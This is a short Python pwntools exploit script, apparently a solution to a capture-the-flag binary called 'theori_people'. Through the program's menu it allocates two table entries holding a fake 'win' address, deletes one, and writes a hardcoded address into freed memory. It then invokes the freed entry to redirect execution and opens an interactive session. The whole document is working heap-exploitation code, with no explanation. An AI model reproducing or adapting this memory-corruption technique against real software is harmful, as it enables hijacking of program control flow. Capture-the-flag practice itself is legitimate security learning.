from pwn import *
p = process("./theori_people")

#p.recvuntil("[helper] : 0x")
#leak = int(p.recvuntil('\n'),16)
leak = 0x603100
win = 0x11111111

#New Table
p.sendline("1")
p.recv(512)
p.sendline(p32(win))
p.recv(512)
p.sendline("1")
p.recv(512)
p.sendline(p32(win))
p.recv(512)

#Delete Table
p.sendline("2")
p.recv(512)
p.sendline("0")
p.recv(512)
p.sendline("Yes")
p.recv(512)
p.sendline("8")
p.sendline(p32(leak))
p.recv(512)

#Call Win() 
p.sendline("3")

p.interactive()
